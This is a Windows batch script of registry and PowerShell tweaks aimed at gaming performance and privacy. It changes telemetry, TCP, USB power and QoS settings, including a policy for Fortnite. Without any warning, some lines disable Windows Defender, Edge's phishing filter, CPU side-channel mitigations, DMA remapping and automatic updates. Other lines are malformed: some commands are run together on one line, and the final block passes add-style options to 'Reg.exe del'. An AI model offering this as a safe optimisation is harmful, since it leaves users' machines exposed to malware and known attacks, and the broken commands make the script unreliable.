reg add "HKLM\System\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d "0" /f   
reg add "HKLM\System\CurrentControlSet\Control\WMI\AutoLogger\SQMLogger" /v "Start" /t REG_DWORD /d "0" /f  
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f   
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient" /v "CorporateSQMURL" /t REG_SZ /d "0.0.0.0" /f  
reg add "HKLM\SYSTEM\CurrentControlSet\Services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "16" /f reg add "HKLM\SYSTEM\CurrentControlSet\Services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "16" /f  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Settings" /v "DownloadMode" /t REG_DWORD /d "0" /f  
cls  
for /f %%a in ('wmic PATH Win32_PnPEntity GET DeviceID ^| findstr /l "USB\VID_"') do (  
C:\Windows\SetACL.exe -on "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters" -ot reg -actn setowner -ownr "n:Administrators"  
C:\Windows\SetACL.exe -on "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters" -ot reg -actn ace -ace "n:Administrators;p:full"  
reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters" /v SelectiveSuspendOn /t REG_DWORD /d 00000000 /f  
reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters" /v SelectiveSuspendEnabled /t REG_BINARY /d 00 /f  
reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters" /v EnhancedPowerManagementEnabled /t REG_DWORD /d 00000000 /f  
reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters" /v AllowIdleIrpInD3 /t REG_DWORD /d 00000000 /f  
)  
for /f %%a in ('wmic PATH Win32_USBHub GET DeviceID ^| findstr /l "USB\ROOT_HUB"') do (  
C:\Windows\SetACL.exe -on "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters\WDF" -ot reg -actn setowner -ownr "n:Administrators"  
reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\%%a\Device Parameters\WDF" /v IdleInWorkingState /t REG_DWORD /d 00000000 /f  
)  
cls  
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 3 /f reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f  
cls  
powershell "ForEach($adapter In Get-NetAdapter){Disable-NetAdapterPowerManagement -Name $adapter.Name -ErrorAction SilentlyContinue}"  
powershell "ForEach($adapter In Get-NetAdapter){Disable-NetAdapterLso -Name $adapter.Name -ErrorAction SilentlyContinue}"  
cls  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "0" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "32" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "8760" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "8760" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "0" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_SZ /d "ffffffff" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "Application Name" /t REG_SZ /d "fortniteclient-win64-shipping.exe" /f   
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "DSCP value" /t REG_SZ /d "46" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "Local IP" /t REG_SZ /d "*" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "Local IP Prefix Length" /t REG_SZ /d "*" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "Local Port" /t REG_SZ /d "*" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "Protocol" /t REG_SZ /d "UDP" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "Remote IP" /t REG_SZ /d "*" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "Remote IP Prefix Length" /t REG_SZ /d "*" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "Remote Port" /t REG_SZ /d "*" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "throttle Rate" /t REG_SZ /d "-1" /f  
REG ADD "HKEY_LOCAL_MACHINE\SOftWARE\Policies\Microsoft\Windows\QoS\fortnite" /v "version" /t REG_SZ /d "1.0" /f  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\pci\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\rt640x64\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\storahci\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\stornvme\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f  
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\pci\Parameters" /v "DmaRemappingCompatible" /t REG_DWORD /d "0" /f 
cls
schtasks /Change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /Disable >nul 2>&1 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Visibility" /v "DiagnosticErrorText" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Strings" /v "DiagnosticErrorText" /t REG_SZ /d "" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Strings" /v "DiagnosticLinkText" /t REG_SZ /d "" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\TabletPC" /v "PreventHandwritingDataSharing" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableUAR" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v "NoLockScreenCamera" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Input\TIPC" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowExperimentation" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Bluetooth" /v "AllowAdvertising" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Messaging" /v "AllowMessageSync" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Biometrics" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications" /v "ToastEnabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{C1D23ACC-752B-43E5-8448-8D0E519CD6D6}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{2297E4E2-5DBE-466D-A12B-0F8286F0D9CA}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{E5323777-F976-4f5b-9B55-B94699C46E44}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{2EEF81BE-33FA-4800-9670-1CD474972C3F}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{52079E78-A92B-413F-B213-E8FE35712E72}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1   
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{7D7E8402-7C54-4821-A34E-AEEFD62DED93}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{D89823BA-7180-4B81-B50C-7E471E6121A3}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{8BC668CF-7728-45BD-93F8-CF2B3B41D7AB}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{9231CB4C-BF57-4AF3-8C55-FDA7BFCC04C5}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{E390DF20-07DF-446D-B962-F5C953062741}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{992AFA70-6F47-4148-B3E9-3003349C1548}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\WMDRM" /v "DisableOnline" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{A8804298-2D5F-42E3-9531-9C8C39EB29CE}" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\LooselyCoupled" /v "Value" /t REG_SZ /d "Deny" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CredUI" /v "DisablePasswordReveal" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\Main" /v "DoNotTrack" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\Main" /v "OptimizeWindowsSearchResultsForScreenReaders" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\FlipAhead" /v "FPEnabled" /t REG_DWORD /d "0" /f  >nul 2>&1  
Reg.exe add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\User\Default\SearchScopes" /v "ShowSearchSuggestionsGlobal" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Browser" /v "AllowAddressBarDropdown" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\Privacy" /v "EnableEncryptedMediaExtensions" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Personalization" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\BrowserSettings" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Credentials" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Accessibility" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Windows" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Speech_OneCore\Preferences" /v "ModelDownloadAllowed" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableWindowsLocationProvider" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocationScripting" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Sensor\Permissions\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}" /v "SensorPermissionState" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeliveryOptimization" /v "DODownloadMode" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization" /v "SystemSettingsDownloadMode" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Speech" /v "AllowSpeechModelUpdate" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpgrade" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpgradePeriod" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpdatePeriod" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "PreventDeviceMetadataFromNetwork" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate" /v "AutoDownload" /t REG_DWORD /d "2" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d "3" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Services\7971f918-a847-4430-9279-4a52d1efe18d" /v "RegisteredWithAU" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Microsoft\OneDrive" /v "PreventNetworkTrafficPreUserSignIn" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpyNetReporting" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f >nul 2>&1  
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f >nul 2>&1  
cls
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
cls
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c" /v "ValueMax" /t REG_DWORD /d "100" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ValueMax" /t REG_DWORD /d "100" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "VsyncIdleTimeout" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowgameDVR" /t REG_DWORD /d "0" /f
cls
Reg.exe del "HKLM\SOFTWARE\Intel\GMM" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
cls
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableBoottrace" /t REG_DWORD /d "0" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
cls
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe del "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsMftZoneReservation" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisable8dot3NameCreation" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "DontVerifyRandomDrivers" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisableLastAccessUpdate" /t REG_DWORD /d "1" /f
Reg.exe del "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "ContigFileAllocSize" /t REG_DWORD /d "64" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe del "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
